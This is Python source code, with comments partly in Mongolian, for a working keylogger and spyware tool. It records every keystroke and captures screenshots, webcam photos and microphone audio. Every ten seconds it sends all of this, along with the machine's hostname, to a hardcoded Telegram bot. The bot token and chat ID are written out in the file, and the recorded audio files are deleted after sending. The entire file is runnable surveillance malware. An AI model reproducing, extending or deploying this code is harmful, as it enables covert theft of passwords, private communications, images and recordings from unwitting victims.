import io  # io модулийг нэмэх
from PIL import ImageGrab
import requests
import os
import pyaudio
import wave
import threading
import pynput.keyboard
import socket
import cv2
import sys


class Keylogger:
    def __init__(self, tempo_int, bot_token, chat_id):
        self.log = ""
        self.tempo_int = tempo_int
        self.bot_token = bot_token
        self.chat_id = chat_id
        self.running = True  # Таслах нөхцөл

    def telegram_bot_send(self, log):
        msg = "From: " + socket.gethostname() + "\n\n" + log
        send_text = f"https://api.telegram.org/bot{self.bot_token}/sendMessage?chat_id={self.chat_id}&parse_mode=Markdown&text={msg}"
        requests.get(send_text)

    def telegram_send_photo(self, image_data):
        url = f"https://api.telegram.org/bot{self.bot_token}/sendPhoto"
        files = {'photo': ('screenshot.png', image_data, 'image/png')}
        data = {'chat_id': self.chat_id}
        try:
            response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                print("Photo sent to Telegram successfully!")
            else:
                print(f"Failed to send photo: {response.status_code}, Error: {response.text}")
        except Exception as e:
            print(f"Error sending photo: {str(e)}")

    def telegram_send_audio(self, file_path):
        if not os.path.exists(file_path):
            print(f"File not found: {file_path}")
            return
        url = f"https://api.telegram.org/bot{self.bot_token}/sendAudio"
        files = {'audio': open(file_path, 'rb')}
        data = {'chat_id': self.chat_id}
        try:
            response = requests.post(url, files=files, data=data)
            if response.status_code == 200:
                print("Audio sent to Telegram successfully!")
            else:
                print(f"Failed to send audio: {response.status_code}")
        except Exception as e:
            print(f"Error sending audio: {e}")

    def log_report(self):
        if self.running:
            self.telegram_bot_send(self.log)
            print(self.log)
            screenshot_data = self.take_screenshot()
            if screenshot_data:
                self.telegram_send_photo(screenshot_data)

            camera_photo_data = self.take_photo()
            if camera_photo_data:
                self.telegram_send_photo(camera_photo_data)

            audio_path = self.record_audio()
            if audio_path:
                self.telegram_send_audio(audio_path)
                self.delete_file(audio_path)

            tempo = threading.Timer(self.tempo_int, self.log_report)
            tempo.start()

    def append_to_log(self, string):
        self.log += string

    def get_key_press(self, key):
        try:
            # Эрүүл мэндийн шалгалт хийх
            if hasattr(key, 'char') and key.char is not None:
                current_key = str(key.char)
            else:
                current_key = str(key)
                # Add key codes for special keys
                if key == pynput.keyboard.Key.space:
                    current_key = " "
                elif key == pynput.keyboard.Key.esc:
                    print("Keylogger stopped.")
                    self.running = False
                elif key == pynput.keyboard.Key.shift or key == pynput.keyboard.Key.shift_r:
                    current_key = "[SHIFT]"
                elif key == pynput.keyboard.Key.backspace:
                    current_key = "[BACKSPACE]"
                elif key == pynput.keyboard.Key.enter:
                    current_key = "[ENTER]\n"
                elif key == pynput.keyboard.Key.up:
                    current_key = "[UP]"
                elif key == pynput.keyboard.Key.down:
                    current_key = "[DOWN]"
                elif key == pynput.keyboard.Key.right:
                    current_key = "[RIGHT]"
                elif key == pynput.keyboard.Key.left:
                    current_key = "[LEFT]"
                elif key == pynput.keyboard.Key.ctrl or key == pynput.keyboard.Key.ctrl_r:
                    current_key = "[CTRL]"
                elif 'num_' in str(key):
                    # Identify NumPad keys like num_1, num_2, etc.
                    current_key = f"[NumPad {str(key).replace('num_', '')}]"
                else:
                    current_key = f"[{key}]"
        except Exception as e:
            current_key = f"[ERROR: {str(e)}]"

        self.append_to_log(current_key)

    def take_screenshot(self):
        screenshot = ImageGrab.grab()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        img_byte_arr.seek(0)
        return img_byte_arr

    def take_photo(self):
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            print("Camera not found or already in use.")
            return None
        ret, frame = cap.read()
        if not ret:
            print("Failed to capture photo from camera.")
            return None
        img_byte_arr = io.BytesIO()
        ret, buffer = cv2.imencode('.png', frame)
        if ret:
            img_byte_arr.write(buffer)
            img_byte_arr.seek(0)
        cap.release()
        return img_byte_arr

    def record_audio(self):
        p = pyaudio.PyAudio()
        device_count = p.get_device_count()
        if device_count == 0:
            print("No microphone detected.")
            return None

        audio_path = os.path.join(os.getenv('LOCALAPPDATA'), f"audio_{threading.get_ident()}.wav")
        chunk = 1024
        sample_rate = 44100
        duration = 5

        try:
            stream = p.open(format=pyaudio.paInt16, channels=1, rate=sample_rate, input=True, frames_per_buffer=chunk)
        except OSError as e:
            print(f"Error opening microphone: {e}")
            return None

        frames = []
        for _ in range(int(sample_rate / chunk * duration)):
            try:
                data = stream.read(chunk)
                frames.append(data)
            except Exception as e:
                print(f"Error during recording: {e}")
                break
        stream.stop_stream()
        stream.close()
        p.terminate()

        wf = wave.open(audio_path, 'wb')
        wf.setnchannels(1)
        wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
        wf.setframerate(sample_rate)
        wf.writeframes(b''.join(frames))
        wf.close()

        return audio_path

    def delete_file(self, file_path):
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
            else:
                print(f"File {file_path} not found.")
        except Exception as e:
            print(f"Error deleting file: {e}")

    def start(self):
        key_listener = pynput.keyboard.Listener(on_press=self.get_key_press)
        with key_listener:
            self.log_report()
            key_listener.join()


bot_token = "7222189495:AAF8Qql3aWEMqvZPMMjPACufOXZjHf2Nfk8"
chat_id = "6154191079"

myKey = Keylogger(10, bot_token, chat_id)  # 10 секунд тутамд  авна
myKey.start()
